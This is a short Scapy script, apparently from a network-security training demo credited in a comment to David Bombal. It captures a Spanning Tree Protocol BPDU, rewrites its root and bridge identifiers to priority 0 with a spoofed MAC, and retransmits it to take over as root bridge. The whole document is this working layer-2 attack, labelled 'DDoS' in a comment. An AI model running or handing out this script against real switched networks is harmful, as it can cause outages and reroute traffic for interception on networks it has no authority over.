from scapy.all import *
# DDoS
pkt = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
pkt[0].src="00:00:00:00:00:01"
pkt[0].rootid=0
pkt[0].rootmac="00:00:00:00:00:01"
pkt[0].bridgeid=0 
pkt[0].bridgemac="00:00:00:00:00:01"
re = srp(pkt[0])
# David Bombal